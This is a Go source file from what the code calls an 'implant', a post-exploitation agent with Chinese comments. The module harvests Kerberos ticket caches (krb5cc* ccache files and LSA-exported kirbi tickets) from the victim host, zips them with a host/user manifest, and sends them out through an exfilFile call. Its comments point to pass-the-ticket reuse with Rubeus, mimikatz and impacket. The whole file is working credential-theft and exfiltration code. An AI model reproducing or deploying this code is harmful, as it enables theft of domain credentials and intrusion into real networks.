package services

// Kerberos 票据缓存（MIT ccache）采集。
//
// 只做"文件式"：Windows 原生 LSA 里的票据需要通过 LsaCallAuthenticationPackage
// 枚举，属另一条链路（见 docs/CREDENTIAL_ACCESS.md）。这里覆盖的是工具落盘的
// ccache 文件 —— impacket / Rubeus / kinit / ssh 的 GSSAPI 都会写这种文件。
//
// 制品形态（与服务端 cred.ParseTicketArtifact 对齐）：
//
//	manifest.json         {host,user,collected_at,errors,files:[{name,size}]}
//	tickets/<文件名>       原始 ccache（v3/v4），服务端逐条目解析
//
// 客户端**不解析**票据内容：解析器只有服务端一份，避免两套实现漂移。

import (
	"archive/zip"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"implant/core/debuglog"
)

// 单个 ccache 上限：正常票据文件几十 KB；超限说明不是 ccache 或已被破坏。
const maxCCacheFileBytes = 4 << 20

// maxCCacheFiles 单次采集上限（与服务端 cred.MaxTicketCaches 保持一致）
const maxCCacheFiles = 64

// lsaTicketEntry 清单里的 LSA 票据元数据。
//
// LSA 导出的是 **kirbi（KRB_CRED）**。原先这里写着"它的 enc-part 需要密钥才能解，
// 服务端拿不到客户端 principal" —— 这个说法是**错的**：标准 kirbi 的 enc-part
// etype 为 0，cipher 里就是明文 DER 的 EncKrbCredPart，服务端可以自行解析
// （见 Tshell-server/pkg/cred/kirbi.go 与 ccache-v4-kirbi 夹具）。
//
// 清单仍然保留：客户端本来就知道票据的服务名/时间，写进来多一条交叉校验来源，
// 也对只上传清单的老版本保持兼容。服务端以二进制解析结果为准。
type lsaTicketEntry struct {
	File    string `json:"file"`
	Client  string `json:"client,omitempty"`
	Realm   string `json:"realm,omitempty"`
	Server  string `json:"server"`
	Start   string `json:"start,omitempty"`
	End     string `json:"end,omitempty"`
	Renew   string `json:"renew,omitempty"`
	Flags   uint32 `json:"flags,omitempty"`
	EncType int32  `json:"enc_type,omitempty"`
	Size    int    `json:"size,omitempty"`
}

// ccacheManifest 制品清单（服务端只当真，不校验 —— 条目内容以解析结果为准）
type ccacheManifest struct {
	Host        string   `json:"host"`
	User        string   `json:"user"`
	CollectedAt string   `json:"collected_at"`
	Errors      []string `json:"errors,omitempty"`
	Files       []struct {
		Name string `json:"name"`
		Size int64  `json:"size"`
	} `json:"files"`
	LSATickets []lsaTicketEntry `json:"lsa_tickets,omitempty"`
}

// findCCacheFiles 找出本机可读的 ccache 文件。
//
// 发现顺序：KRB5CCNAME（显式指定优先）→ %TEMP%/临时目录 → 用户主目录 →
// 非 Windows 的 /tmp（Linux/macOS 的默认 ccache 位置）。
// 返回文件清单与"看到了但没法处理"的说明（例如 KRB5CCNAME 指向 KEYRING）。
func findCCacheFiles() ([]string, []string) {
	var files []string
	var notes []string
	seen := map[string]bool{}

	add := func(p string) {
		if p == "" || len(files) >= maxCCacheFiles {
			return
		}
		clean := filepath.Clean(p)
		if seen[clean] {
			return
		}
		st, err := os.Stat(clean)
		if err != nil || st.IsDir() {
			return
		}
		if st.Size() == 0 {
			return
		}
		if st.Size() > maxCCacheFileBytes {
			notes = append(notes, fmt.Sprintf("%s 超过 %d KB，跳过", filepath.Base(clean), maxCCacheFileBytes>>10))
			return
		}
		seen[clean] = true
		files = append(files, clean)
	}

	if v := strings.TrimSpace(os.Getenv("KRB5CCNAME")); v != "" {
		switch {
		case strings.HasPrefix(v, "FILE:"):
			add(strings.TrimPrefix(v, "FILE:"))
		case strings.Contains(v, ":"):
			// KEYRING: / DIR: / API: 等非文件后端：无法打包成文件，明确记录
			notes = append(notes, "KRB5CCNAME 指向非文件后端，未采集: "+v)
		default:
			add(v)
		}
	}

	dirs := []string{os.TempDir()}
	if home, err := os.UserHomeDir(); err == nil && home != "" {
		dirs = append(dirs, home)
	}
	if runtime.GOOS != "windows" {
		dirs = append(dirs, "/tmp")
	}
	for _, dir := range dirs {
		entries, err := os.ReadDir(dir)
		if err != nil {
			continue
		}
		for _, e := range entries {
			if e.IsDir() || !strings.HasPrefix(e.Name(), "krb5cc") {
				continue
			}
			add(filepath.Join(dir, e.Name()))
		}
	}
	return files, notes
}

// credDumpTickets Kerberos 票据缓存：打包 ZIP → 异步回传
//
// tech=files：本机 ccache 文件（任意平台）
// tech=lsa  ：Windows LSA 凭据缓存（枚举 + 导出 kirbi，见 lsa_windows.go）
func credDumpTickets(tech, fileName string) ([]byte, error) {
	if tech == "lsa" {
		return credDumpLSATickets(fileName)
	}
	files, notes := findCCacheFiles()
	if len(files) == 0 {
		msg := "未发现 Kerberos 票据缓存文件（krb5cc*）"
		if len(notes) > 0 {
			msg += "；" + strings.Join(notes, "；")
		}
		return nil, errors.New(msg)
	}

	destPath := credTempPath(fileName)
	_ = os.Remove(destPath)
	n, err := writeTicketBundle(destPath, files, notes)
	if err != nil {
		return nil, err
	}
	debuglog.Printf("✅ [CRED] Kerberos 票据缓存已打包: %s（%d 个缓存），开始回传\n", destPath, n)
	go exfilFile(destPath, true)

	msg := fmt.Sprintf("[+] Kerberos 票据缓存已打包并开始回传: %s（%d 个缓存", fileName, n)
	if len(notes) > 0 {
		msg += fmt.Sprintf("；%d 项说明", len(notes))
	}
	return []byte(msg + "）"), nil
}

// writeTicketBundle 生成 ZIP（manifest.json + tickets/<name>），返回写入的缓存数。
func writeTicketBundle(destPath string, files []string, notes []string) (int, error) {
	out, err := os.OpenFile(destPath, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0o600)
	if err != nil {
		return 0, fmt.Errorf("创建票据制品失败: %w", err)
	}
	defer out.Close()

	zw := zip.NewWriter(out)
	host, _ := os.Hostname() // 跨平台；browser 侧的 hostnameOrEmpty 是 Windows 专有文件里的
	manifest := ccacheManifest{
		Host:        host,
		User:        os.Getenv("USERNAME"),
		CollectedAt: time.Now().Format("2006-01-02 15:04:05"),
		Errors:      notes,
	}
	if manifest.User == "" {
		manifest.User = os.Getenv("USER")
	}

	written := 0
	for _, src := range files {
		raw, err := os.ReadFile(src)
		if err != nil {
			manifest.Errors = append(manifest.Errors, fmt.Sprintf("%s: %v", filepath.Base(src), err))
			continue
		}
		// 同一目录下重名（极罕见）：加上目录前缀避免 ZIP 内覆盖
		name := filepath.Base(src)
		entry, err := zw.Create("tickets/" + name)
		if err != nil {
			return written, fmt.Errorf("写入制品条目失败: %w", err)
		}
		if _, err := entry.Write(raw); err != nil {
			return written, fmt.Errorf("写入票据内容失败: %w", err)
		}
		manifest.Files = append(manifest.Files, struct {
			Name string `json:"name"`
			Size int64  `json:"size"`
		}{Name: name, Size: int64(len(raw))})
		written++
	}
	if written == 0 {
		_ = zw.Close()
		return 0, errors.New("所有票据缓存文件都读取失败")
	}

	mb, err := zw.Create("manifest.json")
	if err != nil {
		return written, fmt.Errorf("写入清单失败: %w", err)
	}
	enc := json.NewEncoder(mb)
	enc.SetIndent("", "  ")
	if err := enc.Encode(manifest); err != nil {
		return written, fmt.Errorf("序列化清单失败: %w", err)
	}
	if err := zw.Close(); err != nil {
		return written, fmt.Errorf("关闭制品失败: %w", err)
	}
	return written, nil
}

// sanitizeTicketFile 把服务名（含 / 与 *）变成安全的 ZIP 内文件名。
func sanitizeTicketFile(server string) string {
	var b strings.Builder
	for _, r := range server {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9', r == '-', r == '_':
			b.WriteRune(r)
		default:
			b.WriteByte('_')
		}
	}
	if b.Len() == 0 {
		return "ticket"
	}
	return b.String()
}

// writeLSATicketBundle 生成 LSA 票据制品：manifest.json（含 lsa_tickets 元数据）+
// kirbi/<序号>-<服务名>.kirbi。
//
// kirbi 是原始 KRB_CRED，可直接用于 ptt（Rubeus / mimikatz kerberos::ptt）或
// impacket 的 ticketConverter 转 ccache。
func writeLSATicketBundle(destPath string, tickets []lsaTicket, errs []string) (int, error) {
	out, err := os.OpenFile(destPath, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0o600)
	if err != nil {
		return 0, fmt.Errorf("创建票据制品失败: %w", err)
	}
	defer out.Close()

	zw := zip.NewWriter(out)
	host, _ := os.Hostname()
	manifest := ccacheManifest{
		Host:        host,
		User:        os.Getenv("USERNAME"),
		CollectedAt: time.Now().Format("2006-01-02 15:04:05"),
		Errors:      errs,
	}

	written := 0
	for i, t := range tickets {
		if len(t.KerbCred) == 0 {
			continue
		}
		name := fmt.Sprintf("kirbi/%02d-%s.kirbi", i+1, sanitizeTicketFile(t.Server))
		entry, err := zw.Create(name)
		if err != nil {
			return written, fmt.Errorf("写入票据条目失败: %w", err)
		}
		if _, err := entry.Write(t.KerbCred); err != nil {
			return written, fmt.Errorf("写入票据内容失败: %w", err)
		}
		manifest.LSATickets = append(manifest.LSATickets, lsaTicketEntry{
			File:    name,
			Client:  t.Client,
			Realm:   t.ClientRealm,
			Server:  t.Server,
			Start:   lsaTicketTime(t.Start),
			End:     lsaTicketTime(t.End),
			Renew:   lsaTicketTime(t.Renew),
			Flags:   t.Flags,
			EncType: t.EncType,
			Size:    len(t.KerbCred),
		})
		written++
	}
	if written == 0 {
		_ = zw.Close()
		return 0, errors.New("所有票据导出结果都为空")
	}

	mb, err := zw.Create("manifest.json")
	if err != nil {
		return written, fmt.Errorf("写入清单失败: %w", err)
	}
	enc := json.NewEncoder(mb)
	enc.SetIndent("", "  ")
	if err := enc.Encode(manifest); err != nil {
		return written, fmt.Errorf("序列化清单失败: %w", err)
	}
	if err := zw.Close(); err != nil {
		return written, fmt.Errorf("关闭制品失败: %w", err)
	}
	return written, nil
}
